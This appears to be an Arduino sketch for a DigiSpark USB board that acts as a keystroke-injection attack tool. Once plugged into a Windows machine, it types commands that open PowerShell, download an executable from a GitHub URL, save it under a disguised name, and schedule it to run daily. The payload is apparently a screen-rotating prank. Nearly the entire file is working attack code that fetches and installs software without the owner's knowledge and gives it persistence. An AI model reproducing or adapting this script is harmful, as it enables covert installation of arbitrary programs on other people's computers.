//=========================================================//
//---------------------- RMB ------------------------------//
//=========================================================//
#include "DigiKeyboard.h"
void setup() {
  //empty
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  //download screen rotate exe from the github
  DigiKeyboard.print("$client.DownloadFile(\"https://github.com/SharafMawjood/Screen-Rotator-Loop-Python-Script/raw/main/screen.exe\" , \"zw.exe\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  //create task shedule 10:12, 13:12, 17:12
  //and it run everyday
  DigiKeyboard.print("schtasks /create /sc daily /tn MyTask /tr \"%USERPROFILE%\\zw.exe\" /st 10:12");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("schtasks /create /sc daily /tn MyTask /tr \"%USERPROFILE%\\zw.exe\" /st 13:12");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("schtasks /create /sc daily /tn MyTask /tr \"%USERPROFILE%\\zw.exe\" /st 17:12");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  for(;;){ /*empty*/ }
}
